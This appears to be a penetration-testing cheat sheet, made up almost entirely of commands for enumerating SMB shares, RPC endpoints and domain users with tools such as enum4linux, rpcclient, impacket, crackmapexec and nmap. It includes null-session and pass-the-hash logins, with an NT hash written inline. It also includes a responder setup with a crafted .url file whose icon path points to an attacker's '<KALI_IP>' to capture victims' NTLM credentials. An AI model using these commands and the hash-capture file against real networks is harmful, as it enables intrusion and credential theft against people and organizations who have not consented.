**Scan** a network searching for hosts:

```
enum4linux $ip
```

```c
smbclient -L //192.168.204.151/
```

```
nbtscan -r 192.168.0.1/24
```

```
nmap -p 139,445 --script=smb-enum-shares $IP
```

#### If you can log in with null session aka no username/password:
start responder:
```c
responder -i tun0
```

Then...
```c
vim offsec.url
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\<KALI_IP>\%USERNAME%.icon
IconIndex=1
# the username should not be edited, thats the windows side variable we want to leverage

```


```
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```


```
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```